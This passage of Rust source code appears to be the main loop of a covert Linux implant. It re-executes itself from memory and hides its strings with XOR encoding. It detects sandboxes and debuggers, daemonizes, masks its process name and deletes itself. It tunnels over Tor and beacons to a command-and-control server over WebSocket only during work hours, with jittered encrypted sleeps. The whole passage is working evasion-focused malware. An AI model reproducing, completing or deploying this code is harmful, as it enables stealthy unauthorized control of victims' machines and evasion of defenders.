                argv.push(std::ptr::null());

                let marker = CString::new(xor_decode(&ENC_MFD_KEY)).unwrap();
                let val = CString::new(xor_decode(&ENC_MFD_VAL)).unwrap();
                libc::setenv(marker.as_ptr(), val.as_ptr(), 1);

                libc::execve(path_c.as_ptr(), argv.as_ptr(), std::ptr::null());
                let _ = std::fs::remove_file(&shm_path);
            }
        }
    }
}

fn is_running_from_memfd() -> bool {
    let key = xor_decode_str(&ENC_MFD_KEY);
    if env::var(&key).is_ok() {
        std::env::remove_var(&key);
        true
    } else {
        false
    }
}

// ── Main ────────────────────────────────────────────────────────────────

fn main() {
    let debug = env::args().any(|a| a == "--debug");

    prevent_core_dump();
    lock_memory();

    if !debug {
        if !is_running_from_memfd() {
            reexec_from_memory();
        }
    } else {
        eprintln!("[DBG] skipping memfd re-exec");
    }

    if check_sandbox() {
        if debug { eprintln!("[DBG] sandbox detected, exiting"); }
        std::thread::sleep(Duration::from_secs(jitter(3600)));
        return;
    }
    if debug { eprintln!("[DBG] sandbox check passed"); }

    let mut ip_raw = xor_decode(&ENC_DEFAULT_IP);
    let positional: Vec<String> = env::args().skip(1).filter(|a| !a.starts_with('-')).collect();
    let ip = positional.first().map(|s| s.clone()).unwrap_or_else(|| String::from_utf8_lossy(&ip_raw).to_string());
    let port = positional.get(1).map(|s| s.clone()).unwrap_or_else(|| xor_decode_str(&ENC_DEFAULT_PORT));
    secure_zero(&mut ip_raw);

    if debug {
        eprintln!("[DBG] target={}:{}", ip, port);
    }

    if !debug {
        daemonize();
        mask_process_name();
        self_delete();
    } else {
        eprintln!("[DBG] skipping daemonize/masquerade/self-delete");
    }

    // Auto-setup Tor proxy if in Tor mode
    if !ensure_tor_running() {
        set_proxy_fallback();
    }

    // Split implant: fork executor process
    if let Some((net_fd, exec_fd)) = create_ipc_pair() {
        unsafe {
            let pid = libc::fork();
            if pid < 0 {
                // Fork failed, run unsplit
                libc::close(net_fd);
                libc::close(exec_fd);
            } else if pid == 0 {
                // Child = executor process
                libc::close(net_fd);
                run_executor(exec_fd);
            } else {
                // Parent = network process
                libc::close(exec_fd);
                EXECUTOR_IPC_FD = net_fd;
            }
        }
    }

    let mut attempt = 0usize;

    loop {
        if !debug && is_debugger_attached() {
            sleep_mask_encrypt(Duration::from_secs(jitter(600)));
            continue;
        }

        if !is_work_hours() {
            let sleep_secs = jitter(seconds_until_work_hours());
            sleep_mask_encrypt(Duration::from_secs(sleep_secs));
            continue;
        }

        if debug { eprintln!("[DBG] attempt {} — connecting to {}:{}...", attempt+1, ip, port); }
        match connect_wss(&ip, &port) {
            Some(mut ws) => {
                if debug { eprintln!("[DBG] connected!"); }
                attempt = 0;
                let should_reconnect = run_session(&mut ws);
                let _ = ws.close(None);
                if !should_reconnect { break; }
            }
            None => {
                if debug { eprintln!("[DBG] connect_wss returned None"); }
                attempt += 1;
                if attempt > MAX_RECONNECT_ATTEMPTS { break; }
                let delay_idx = (attempt - 1).min(RECONNECT_DELAYS.len() - 1);
                let delay = jitter(RECONNECT_DELAYS[delay_idx]);
                if debug { eprintln!("[DBG] sleeping {}s before retry", delay); }
                // Use sleep mask for reconnect delays too
                if !debug {
                    sleep_mask_encrypt(Duration::from_secs(delay));
                } else {
                    std::thread::sleep(Duration::from_secs(delay));
                }
            }
        }
    }

    // Clean up executor process
    let ipc_fd = unsafe { EXECUTOR_IPC_FD };
    if ipc_fd >= 0 {
        unsafe { libc::close(ipc_fd); }
    }

    // Clean up Tor if we started it
    cleanup_tor();
}
